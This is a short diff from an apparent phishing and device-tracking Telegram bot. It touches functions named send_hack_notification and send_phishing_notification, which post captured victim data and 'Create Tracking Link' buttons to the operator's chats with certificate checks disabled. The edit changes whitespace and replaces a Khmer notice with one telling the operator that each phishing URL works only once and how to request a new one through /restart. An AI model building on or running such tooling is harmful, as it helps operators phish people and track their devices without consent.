@@ -1865,7 +1865,7 @@ def send_hack_notification(track_id, device_info, creator_id):
                     for recipient in recipients:
                         requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                                      json={"chat_id": recipient, "text": error_msg}, verify=False)
-        
+   
         # Send create tracking link button after all photos
         keyboard = [[InlineKeyboardButton("Create Tracking Link", callback_data="create_tracking_link")]]
         reply_markup = json.dumps({"inline_keyboard": keyboard})
@@ -1985,7 +1985,7 @@ def send_phishing_notification(data, creator_id):
                 print(f"❌ Error sending to chat_id {chat_id}: {e}")
         
         # Send restart message
-        restart_message = "អ្នកអាចធ្វើការ /restart នៅពេលដែលចុច /restart វានិងធ្វើ start bot ជាថ្មី"
+        restart_message = "ចំណាំ: URL Phishing អាចប្រើបានតែម្ដងទេ n/បើមានបញ្ហា URL សូមចុចពាក្យ => /restart ដើម្បី Requests URL ឡើងវិញ n/bot និង Start ជាថ្មី"
         for chat_id in recipients:
             url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
             payload = {
